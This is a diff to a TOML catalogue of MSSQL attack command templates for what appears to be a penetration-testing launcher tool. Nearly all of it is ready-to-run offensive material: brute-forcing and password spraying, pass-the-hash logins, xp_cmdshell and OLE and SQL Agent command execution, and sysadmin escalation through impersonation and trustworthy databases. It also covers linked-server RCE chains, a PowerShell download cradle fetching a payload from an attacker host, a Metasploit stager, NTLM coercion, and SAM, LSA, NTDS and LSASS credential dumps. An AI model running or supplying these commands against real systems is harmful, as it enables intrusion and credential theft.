@@ -1,55 +1,268 @@
 category = "mssql"
 display_name = "MSSQL"
-icon = ""
+icon = "󰆼"
 order = 45
+
+# Placeholders (TUI edit or `chronosphere run … -v key=val`):
+#   linked_server=REMOTE_SQL  database=master  sql_query=SELECT @@version
+#   listener={lhost}  mssql_port=1433
+#
+# impacket-mssqlclient shell commands (interactive): enum_db, enum_links, enum_impersonate,
+#   enum_logins, enum_users, enum_owner, exec_as_login {login}, exec_as_user {user},
+#   enable_xp_cmdshell, xp_cmdshell {cmd}, sp_start_job {cmd}, xp_dirtree {path}, use_link {server}
+
+# === Recon / port scan ===
+
+[[command]]
+id = "mssql.nmap.info"
+title = "nmap — ms-sql-info + ntlm-info (1433)"
+template = "nmap -p 1433 -Pn --script ms-sql-info,ms-sql-ntlm-info {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "1433"]
+
+[[command]]
+id = "mssql.nmap.scripts"
+title = "nmap — MSSQL enum scripts (config, tables, access)"
+template = "nmap -p 1433 -Pn --script ms-sql-config,ms-sql-hasdbaccess,ms-sql-tables {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "enum"]
+
+[[command]]
+id = "mssql.nmap.brute"
+title = "nmap — ms-sql-brute (noisy)"
+template = "nmap -p 1433 -Pn --script ms-sql-brute --script-args mssql.username=sa,sa.passwords=/usr/share/wordlists/rockyou.txt {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "brute", "noisy"]
+
+[[command]]
+id = "mssql.nmap.empty_pass"
+title = "nmap — ms-sql-empty-password"
+template = "nmap -p 1433 -Pn --script ms-sql-empty-password {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "default-creds"]
+
+[[command]]
+id = "mssql.recon.portscan"
+title = "nmap — top ports incl. 1433"
+template = "nmap -sS -T4 -Pn --top-ports 1000 -sV {target} | grep -E '1433|MSSQL|sql'"
+requires = ["nmap"]
+tags = ["recon", "nmap"]
+
+# === Auth check (NetExec) ===
 
 [[command]]
 id = "mssql.nxc.checkauth"
 title = "nxc mssql — verify creds"
 template = "nxc mssql {target} {nxc_auth}"
 requires = ["nxc"]
-tags = ["enum", "nxc"]
+tags = ["enum", "nxc", "auth"]
+
+[[command]]
+id = "mssql.nxc.local_auth"
+title = "nxc mssql — local SQL auth (--local-auth)"
+template = "nxc mssql {target} -u '{user}' -p '{password}' --local-auth"
+requires = ["nxc"]
+tags = ["enum", "nxc", "local-auth"]
+when = "creds.kind == 'plaintext'"
 
 [[command]]
 id = "mssql.nxc.windows_auth"
-title = "nxc mssql — Windows auth"
+title = "nxc mssql — Windows auth (-w)"
 template = "nxc mssql {target} -u '{user}' -p '{password}' -d {domain} -w"
 requires = ["nxc"]
-tags = ["enum", "winauth"]
+tags = ["enum", "nxc", "winauth"]
 when = "creds.kind == 'plaintext' and creds.has_domain"
+
+[[command]]
+id = "mssql.nxc.hash"
+title = "nxc mssql — pass-the-hash"
+template = "nxc mssql {target} -u '{user}' -H '{nt_hash}' -d {domain}"
+requires = ["nxc"]
+tags = ["enum", "nxc", "pth"]
+when = "creds.kind == 'ntlm' and creds.has_domain"
+
+[[command]]
+id = "mssql.nxc.kerberos"
+title = "nxc mssql — Kerberos (--use-kcache)"
+template = "nxc mssql {target} -u '{user}' -d {domain} --use-kcache"
+requires = ["nxc"]
+tags = ["enum", "nxc", "kerberos"]
+when = "creds.kind == 'kerberos' and creds.has_domain"
+
+[[command]]
+id = "mssql.nxc.spray"
+title = "nxc mssql — password spray"
+template = "nxc mssql {target} -u users.txt -p 'Spring2025!' --continue-on-success"
+requires = ["nxc"]
+tags = ["spray", "nxc", "noisy"]
+
+[[command]]
+id = "mssql.nxc.list_modules"
+title = "nxc mssql — list available modules"
+template = "nxc mssql {target} {nxc_auth} -L"
+requires = ["nxc"]
+tags = ["enum", "nxc", "modules"]
+
+# === Enumeration (queries + modules) ===
+
+[[command]]
+id = "mssql.nxc.version"
+title = "nxc mssql — SELECT @@VERSION"
+template = "nxc mssql {target} {nxc_auth} -q \"SELECT @@VERSION;\""
+requires = ["nxc"]
+tags = ["enum", "nxc", "query"]
 
 [[command]]
 id = "mssql.nxc.databases"
 title = "nxc mssql — list databases"
-template = "nxc mssql {target} {nxc_auth} -M mssql_priv"
+template = "nxc mssql {target} {nxc_auth} -q \"SELECT name FROM sys.databases;\""
 requires = ["nxc"]
-tags = ["enum"]
+tags = ["enum", "nxc", "query"]
+
+[[command]]
+id = "mssql.nxc.logins"
+title = "nxc mssql — enumerate SQL/logins"
+template = "nxc mssql {target} {nxc_auth} -M enum_logins"
+requires = ["nxc"]
+tags = ["enum", "nxc", "logins"]
+
+[[command]]
+id = "mssql.nxc.impersonate"
+title = "nxc mssql — IMPERSONATE privileges"
+template = "nxc mssql {target} {nxc_auth} -M enum_impersonate"
+requires = ["nxc"]
+tags = ["enum", "nxc", "impersonate", "privesc"]
+
+[[command]]
+id = "mssql.nxc.linked_servers"
+title = "nxc mssql — linked servers"
+template = "nxc mssql {target} {nxc_auth} -M enum_links"
+requires = ["nxc"]
+tags = ["enum", "nxc", "linked"]
+
+[[command]]
+id = "mssql.nxc.sysadmin_check"
+title = "nxc mssql — check sysadmin role"
+template = "nxc mssql {target} {nxc_auth} -q \"SELECT SUSER_NAME(), IS_SRVROLEMEMBER('sysadmin');\""
+requires = ["nxc"]
+tags = ["enum", "nxc", "privesc"]
+
+[[command]]
+id = "mssql.nxc.config"
+title = "nxc mssql — xp_cmdshell / OLE / remote access flags"
+template = "nxc mssql {target} {nxc_auth} -q \"SELECT name, CAST(value_in_use AS INT) AS enabled FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','remote access','Database Mail XPs','clr enabled');\""
+requires = ["nxc"]
+tags = ["enum", "nxc", "config"]
+
+[[command]]
+id = "mssql.nxc.trusted_db"
+title = "nxc mssql — trustworthy databases (db_owner privesc path)"
+template = "nxc mssql {target} {nxc_auth} -q \"SELECT d.name FROM sys.databases d WHERE d.is_trustworthy_on = 1 AND d.name NOT IN ('tempdb');\""
+requires = ["nxc"]
+tags = ["enum", "nxc", "privesc", "trustworthy"]
+
+[[command]]
+id = "mssql.nxc.custom_query"
+title = "nxc mssql — run custom query"
+template = "nxc mssql {target} {nxc_auth} -q \"{sql_query}\""
+requires = ["nxc"]
+tags = ["query", "nxc"]
+
+[[command]]
+id = "mssql.nxc.priv_audit"
+title = "nxc mssql — mssql_priv audit (enum only)"
+template = "nxc mssql {target} {nxc_auth} -M mssql_priv -o ACTION=enum_priv"
+requires = ["nxc"]
+tags = ["enum", "nxc", "privesc", "mssql_priv"]
+
+# === Privilege escalation ===
+
+[[command]]
+id = "mssql.nxc.privesc"
+title = "nxc mssql — mssql_priv auto privesc (impersonate/db_owner)"
+template = "nxc mssql {target} {nxc_auth} -M mssql_priv -o ACTION=privesc"
+requires = ["nxc"]
+tags = ["privesc", "nxc", "mssql_priv"]
+
+[[command]]
+id = "mssql.nxc.privesc.rollback"
+title = "nxc mssql — mssql_priv rollback sysadmin"
+template = "nxc mssql {target} {nxc_auth} -M mssql_priv -o ACTION=rollback"
+requires = ["nxc"]
+tags = ["privesc", "nxc", "cleanup"]
+
+[[command]]
+id = "mssql.nxc.enable_cmdshell"
+title = "nxc mssql — enable xp_cmdshell"
+template = "nxc mssql {target} {nxc_auth} -M enable_cmdshell -o ACTION=enable"
+requires = ["nxc"]
+tags = ["privesc", "nxc", "xp_cmdshell"]
+
+[[command]]
+id = "mssql.nxc.disable_cmdshell"
+title = "nxc mssql — disable xp_cmdshell (cleanup)"
+template = "nxc mssql {target} {nxc_auth} -M enable_cmdshell -o ACTION=disable"
+requires = ["nxc"]
+tags = ["cleanup", "nxc", "xp_cmdshell"]
+
+# === Command execution (NetExec) ===
 
 [[command]]
 id = "mssql.nxc.xp_cmdshell"
 title = "nxc mssql — xp_cmdshell whoami"
 template = "nxc mssql {target} {nxc_auth} -x 'whoami'"
 requires = ["nxc"]
-tags = ["exec", "xp_cmdshell"]
+tags = ["exec", "xp_cmdshell", "nxc"]
 when = "creds.kind in ['plaintext','ntlm']"
 
 [[command]]
-id = "mssql.impacket.client"
-title = "impacket-mssqlclient (SQL auth)"
-template = "impacket-mssqlclient '{user}':'{password}'@{target} -windows-auth"
-requires = ["impacket-mssqlclient"]
-tags = ["shell", "interactive"]
-interactive = true
-when = "creds.kind == 'plaintext'"
+id = "mssql.nxc.xp_cmdshell_all"
+title = "nxc mssql — xp_cmdshell whoami /all"
+template = "nxc mssql {target} {nxc_auth} -x 'whoami /all'"
+requires = ["nxc"]
+tags = ["exec", "xp_cmdshell", "nxc"]
+when = "creds.kind in ['plaintext','ntlm']"
 
 [[command]]
-id = "mssql.impacket.client_kerberos"
-title = "impacket-mssqlclient (kerberos)"
-template = "impacket-mssqlclient -k -no-pass '{user_at_domain}'@{target}"
-requires = ["impacket-mssqlclient"]
-tags = ["shell", "interactive", "kerberos"]
-interactive = true
-when = "creds.kind == 'kerberos'"
+id = "mssql.nxc.powershell"
+title = "nxc mssql — PowerShell via -X"
+template = "nxc mssql {target} {nxc_auth} -X 'Get-Process | Select-Object -First 5'"
+requires = ["nxc"]
+tags = ["exec", "powershell", "nxc"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "mssql.nxc.powershell_download"
+title = "nxc mssql — PowerShell download cradle (edit URL)"
+template = "nxc mssql {target} {nxc_auth} -X 'IEX (New-Object Net.WebClient).DownloadString(\"http://{lhost}/payload.ps1\")'"
+requires = ["nxc"]
+tags = ["exec", "powershell", "nxc", "postex"]
+when = "creds.kind in ['plaintext','ntlm'] and target.has_lhost"
+
+[[command]]
+id = "mssql.nxc.xp_dirtree"
+title = "nxc mssql — xp_dirtree (UNC coerce probe)"
+template = "nxc mssql {target} {nxc_auth} -q \"EXEC master..xp_dirtree '\\\\{listener}\\share';\""
+requires = ["nxc"]
+tags = ["coerce", "nxc", "xp_dirtree"]
+
+[[command]]
+id = "mssql.nxc.coerce"
+title = "nxc mssql — mssql_coerce (multi UNC primitives)"
+template = "nxc mssql {target} {nxc_auth} -M mssql_coerce -o LISTENER={listener}"
+requires = ["nxc"]
+tags = ["coerce", "nxc", "responder"]
+
+[[command]]
+id = "mssql.chain.coerce_capture"
+title = "chain: Responder + mssql_coerce"
+template = """sudo responder -I tun0 -wd &
+sleep 3
+nxc mssql {target} {nxc_auth} -M mssql_coerce -o LISTENER={listener}"""
+requires = ["nxc", "responder"]
+tags = ["chain", "coerce", "responder"]
+
+# === Linked servers ===
 
 [[command]]
 id = "mssql.linkedserver.enum"
@@ -57,3 +270,240 @@ title = "nxc mssql — linked-server crawl"
 template = "nxc mssql {target} {nxc_auth} -M enum_links"
 requires = ["nxc"]
 tags = ["linked", "enum"]
+
+[[command]]
+id = "mssql.linkedserver.query"
+title = "nxc mssql — SQL query on linked server"
+template = "nxc mssql {target} {nxc_auth} -M exec_on_link -o LINKED_SERVER={linked_server} COMMAND='select @@servername'"
+requires = ["nxc"]
+tags = ["linked", "query"]
+
+[[command]]
+id = "mssql.linkedserver.enable_xp"
+title = "nxc mssql — enable xp_cmdshell on linked server"
+template = "nxc mssql {target} {nxc_auth} -M link_enable_cmdshell -o LINKED_SERVER={linked_server} ACTION=enable"
+requires = ["nxc"]
+tags = ["linked", "xp_cmdshell", "privesc"]
+
+[[command]]
+id = "mssql.linkedserver.xpcmd"
+title = "nxc mssql — xp_cmdshell on linked server"
+template = "nxc mssql {target} {nxc_auth} -M link_xpcmd -o LINKED_SERVER={linked_server} CMD='whoami'"
+requires = ["nxc"]
+tags = ["linked", "exec", "xp_cmdshell"]
+
+[[command]]
+id = "mssql.linkedserver.disable_xp"
+title = "nxc mssql — disable xp_cmdshell on linked server"
+template = "nxc mssql {target} {nxc_auth} -M link_enable_cmdshell -o LINKED_SERVER={linked_server} ACTION=disable"
+requires = ["nxc"]
+tags = ["linked", "cleanup"]
+
+[[command]]
+id = "mssql.chain.linked_rce"
+title = "chain: enum links → enable xp → whoami on link"
+template = """nxc mssql {target} {nxc_auth} -M enum_links \\
+ && nxc mssql {target} {nxc_auth} -M link_enable_cmdshell -o LINKED_SERVER={linked_server} ACTION=enable \\
+ && nxc mssql {target} {nxc_auth} -M link_xpcmd -o LINKED_SERVER={linked_server} CMD='whoami'"""
+requires = ["nxc"]
+tags = ["chain", "linked", "xp_cmdshell"]
+
+# === impacket-mssqlclient (interactive shells) ===
+
+[[command]]
+id = "mssql.impacket.client"
+title = "impacket-mssqlclient — Windows auth shell"
+template = "impacket-mssqlclient '{user_at_domain}:{password}@{target}' -windows-auth"
+requires = ["impacket-mssqlclient"]
+tags = ["shell", "interactive", "winauth"]
+interactive = true
+when = "creds.kind == 'plaintext' and creds.has_domain"
+
+[[command]]
+id = "mssql.impacket.client_sql"
+title = "impacket-mssqlclient — SQL auth (no -windows-auth)"
+template = "impacket-mssqlclient '{user}:{password}@{target}'"
+requires = ["impacket-mssqlclient"]
+tags = ["shell", "interactive", "sql-auth"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "mssql.impacket.client_hash"
+title = "impacket-mssqlclient — NTLM hash (PtH)"
+template = "impacket-mssqlclient '{user_at_domain}'@{target} -windows-auth -hashes ':{nt_hash}'"
+requires = ["impacket-mssqlclient"]
+tags = ["shell", "interactive", "pth"]
+interactive = true
+when = "creds.kind == 'ntlm' and creds.has_domain"
+
+[[command]]
+id = "mssql.impacket.client_kerberos"
+title = "impacket-mssqlclient — Kerberos"
+template = "impacket-mssqlclient -k -no-pass '{user_at_domain}'@{target}"
+requires = ["impacket-mssqlclient"]
+tags = ["shell", "interactive", "kerberos"]
+interactive = true
+when = "creds.kind == 'kerberos'"
+
+[[command]]
+id = "mssql.impacket.enum_pipe"
+title = "impacket-mssqlclient — non-interactive enum (pipe commands)"
+template = "printf 'enum_db\\nenum_logins\\nenum_impersonate\\nenum_links\\nexit\\n' | impacket-mssqlclient '{user_at_domain}:{password}@{target}' -windows-auth"
+requires = ["impacket-mssqlclient"]
+tags = ["enum", "impacket"]
+when = "creds.kind == 'plaintext' and creds.has_domain"
+
+# === Native clients (sqlcmd / sqsh) ===
+
+[[command]]
+id = "mssql.sqlcmd.query"
+title = "sqlcmd — run query (Windows auth)"
+template = "sqlcmd -S {target} -U '{domain}\\{user}' -P '{password}' -Q \"SELECT @@VERSION;\""
+requires = ["sqlcmd"]
+tags = ["query", "sqlcmd"]
+when = "creds.kind == 'plaintext' and creds.has_domain"
+
+[[command]]
+id = "mssql.sqlcmd.interactive"
+title = "sqlcmd — interactive session"
+template = "sqlcmd -S {target} -U '{domain}\\{user}' -P '{password}'"
+requires = ["sqlcmd"]
+tags = ["shell", "interactive", "sqlcmd"]
+interactive = true
+when = "creds.kind == 'plaintext' and creds.has_domain"
+
+[[command]]
+id = "mssql.sqsh.connect"
+title = "sqsh — interactive SQL shell"
+template = "sqsh -S {target} -U '{user}' -P '{password}'"
+requires = ["sqsh"]
+tags = ["shell", "interactive", "sqsh"]
+interactive = true
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "mssql.sqsh.query"
+title = "sqsh — one-shot query"
+template = "sqsh -S {target} -U '{user}' -P '{password}' -C \"SELECT name FROM sys.databases;\""
+requires = ["sqsh"]
+tags = ["query", "sqsh"]
+when = "creds.kind == 'plaintext'"
+
+# === Manual SQL (privesc / exec templates) ===
+
+[[command]]
+id = "mssql.sql.enable_xp_cmdshell"
+title = "SQL — enable xp_cmdshell manually"
+template = "nxc mssql {target} {nxc_auth} -q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\""
+requires = ["nxc"]
+tags = ["xp_cmdshell", "privesc", "query"]
+
+[[command]]
+id = "mssql.sql.exec_as_sa"
+title = "SQL — EXECUTE AS LOGIN = 'sa' (after enum_impersonate)"
+template = "nxc mssql {target} {nxc_auth} -q \"USE msdb; EXECUTE AS LOGIN = 'sa'; SELECT SUSER_NAME(), IS_SRVROLEMEMBER('sysadmin');\""
+requires = ["nxc"]
+tags = ["privesc", "impersonate", "query"]
+
+[[command]]
+id = "mssql.sql.enable_ole"
+title = "SQL — enable Ole Automation Procedures"
+template = "nxc mssql {target} {nxc_auth} -q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\""
+requires = ["nxc"]
+tags = ["privesc", "ole", "query"]
+
+[[command]]
+id = "mssql.sql.ole_exec"
+title = "SQL — command exec via OLE (requires ole enabled)"
+template = "nxc mssql {target} {nxc_auth} -q \"DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd.exe /c whoami > C:\\\\Windows\\\\Temp\\\\out.txt';\""
+requires = ["nxc"]
+tags = ["exec", "ole", "query"]
+
+[[command]]
+id = "mssql.sql.agent_job"
+title = "SQL — blind exec via SQL Agent job (sp_start_job pattern)"
+template = "nxc mssql {target} {nxc_auth} -q \"EXEC msdb.dbo.sp_add_job @job_name='chronos'; EXEC msdb.dbo.sp_add_jobstep @job_name='chronos', @step_name='s', @subsystem='CmdExec', @command='whoami > C:\\\\Windows\\\\Temp\\\\job.txt'; EXEC msdb.dbo.sp_add_jobserver @job_name='chronos'; EXEC msdb.dbo.sp_start_job @job_name='chronos';\""
+requires = ["nxc"]
+tags = ["exec", "agent", "query"]
+
+[[command]]
+id = "mssql.sql.trustworthy_sp"
+title = "SQL — trustworthy db_owner → sysadmin (manual)"
+template = "nxc mssql {target} {nxc_auth} -q \"USE {database}; CREATE PROCEDURE sp_chrono WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember SUSER_SNAME(),'sysadmin' END; EXEC sp_chrono; DROP PROCEDURE sp_chrono;\""
+requires = ["nxc"]
+tags = ["privesc", "trustworthy", "query"]
+
+# === Brute force ===
+
+[[command]]
+id = "mssql.hydra.sa"
+title = "hydra — brute MSSQL sa account"
+template = "hydra -l sa -P /usr/share/wordlists/rockyou.txt {target} mssql -t 4"
+requires = ["hydra"]
+tags = ["brute", "noisy"]
+
+[[command]]
+id = "mssql.hydra.user"
+title = "hydra — brute single user"
+template = "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} mssql -t 4"
+requires = ["hydra"]
+tags = ["brute", "noisy"]
+when = "creds.authenticated"
+
+# === Post-exploitation (sysadmin) ===
+
+[[command]]
+id = "mssql.nxc.hashdump"
+title = "nxc mssql — SAM dump (needs sysadmin + admin)"
+template = "nxc mssql {target} {nxc_auth} --sam"
+requires = ["nxc"]
+tags = ["postex", "dump", "sam"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "mssql.nxc.lsa"
+title = "nxc mssql — LSA secrets dump"
+template = "nxc mssql {target} {nxc_auth} --lsa"
+requires = ["nxc"]
+tags = ["postex", "dump", "lsa"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "mssql.nxc.secretsdump"
+title = "nxc mssql — secretsdump via MSSQL channel"
+template = "nxc mssql {target} {nxc_auth} --ntds"
+requires = ["nxc"]
+tags = ["postex", "dump", "ntds"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "mssql.nxc.met_inject"
+title = "nxc mssql — met_inject (high priv module)"
+template = "nxc mssql {target} {nxc_auth} -M met_inject"
+requires = ["nxc"]
+tags = ["postex", "metasploit", "inject"]
+
+[[command]]
+id = "mssql.nxc.web_delivery"
+title = "nxc mssql — web_delivery Metasploit stager"
+template = "nxc mssql {target} {nxc_auth} -M web_delivery -o URL=http://{lhost}:8080/payload"
+requires = ["nxc"]
+tags = ["postex", "metasploit"]
+when = "target.has_lhost"
+
+[[command]]
+id = "mssql.nxc.nanodump"
+title = "nxc mssql — nanodump LSASS (high priv module)"
+template = "nxc mssql {target} {nxc_auth} -M nanodump"
+requires = ["nxc"]
+tags = ["postex", "dump", "lsass"]
+
+[[command]]
+id = "mssql.chain.auth_to_rce"
+title = "chain: privesc → enable xp_cmdshell → whoami"
+template = """nxc mssql {target} {nxc_auth} -M mssql_priv -o ACTION=privesc \\
+ && nxc mssql {target} {nxc_auth} -M enable_cmdshell -o ACTION=enable \\
+ && nxc mssql {target} {nxc_auth} -x 'whoami /all'"""
+requires = ["nxc"]
+tags = ["chain", "privesc", "xp_cmdshell"]
